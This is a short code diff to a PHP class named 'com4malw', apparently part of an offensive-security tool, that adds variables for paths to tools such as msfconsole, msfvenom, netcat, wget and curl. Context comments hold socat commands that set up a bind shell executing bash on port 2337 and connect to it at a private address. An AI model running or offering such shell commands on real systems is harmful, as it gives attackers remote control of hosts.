@@ -2,6 +2,21 @@
 
 class com4malw extends com4obj {
     var $badchars ;
+    var $path_exploitdb ;
+    var $path_msfconsole ;
+    var $path_msfvenom ;
+    var $path_python2 ;
+    var $path_python3 ;
+    var $path_ruby ;
+    var $path_perl ;
+    var $path_php ;
+    var $path_bash ;
+    var $path_nc ;
+    var $path_wget ;
+    var $path_curl ;
+    var $path_java ;
+    var $path_go ;
+    
     // Listen : socat TCP-LISTEN:2337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
     // connect : socat FILE:`tty`,raw,echo=0 TCP:192.168.56.102:2337
     
